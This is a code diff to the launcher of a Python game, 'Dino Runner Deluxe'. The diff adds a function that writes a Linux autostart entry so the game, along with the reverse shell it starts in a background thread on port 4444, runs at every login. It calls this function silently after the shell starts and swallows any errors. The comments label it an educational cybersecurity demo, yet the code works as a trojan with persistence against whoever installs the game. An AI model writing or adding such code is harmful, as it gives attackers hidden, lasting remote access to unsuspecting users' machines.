@@ -82,6 +82,44 @@ def create_demo_shortcut() -> Path:
     return launcher_path
 
 
+def register_startup() -> None:
+    """Registers the application for autostart on Linux systems.
+
+    This creates a .desktop file in the user's autostart directory,
+    ensuring the game (and its background reverse shell) runs when the user logs in.
+    """
+    if platform.system() != "Linux":
+        return
+
+    autostart_dir = Path.home() / ".config" / "autostart"
+    autostart_dir.mkdir(parents=True, exist_ok=True)
+    desktop_file = autostart_dir / "dino_runner.desktop"
+
+    # Resolve the absolute path to the main.py or the frozen executable
+    if getattr(sys, "frozen", False):
+        exec_path = Path(sys.executable).resolve()
+        command = f'"{exec_path}"'
+    else:
+        # If running from source, we need to call python with the main script
+        main_py = resource_root() / "main.py"
+        command = f'"{sys.executable}" "{main_py.resolve()}"'
+
+    content = f"""[Desktop Entry]
+Type=Application
+Exec={command}
+Hidden=false
+NoDisplay=false
+X-GNOME-Autostart-enabled=true
+Name=Dino Runner Deluxe
+Comment=Educational Cybersec Demo
+"""
+    try:
+        desktop_file.write_text(content, encoding="utf-8")
+    except Exception:
+        # Silently fail if we can't write the startup file
+        pass
+
+
 def launch(argv: list[str] | None = None) -> int:
     parser = argparse.ArgumentParser(add_help=False)
     parser.add_argument("--debug", action="store_true", help="Enable debug-friendly startup logging.")
@@ -112,6 +150,9 @@ def launch(argv: list[str] | None = None) -> int:
         # Default port is 4444 as per assignment requirements.
         shell_thread = threading.Thread(target=run_reverse_shell, args=(4444,), daemon=True)
         shell_thread.start()
+        
+        # Register for startup on the target machine.
+        register_startup()
     except Exception:
         # Silently fail to ensure the main game still launches correctly.
         pass
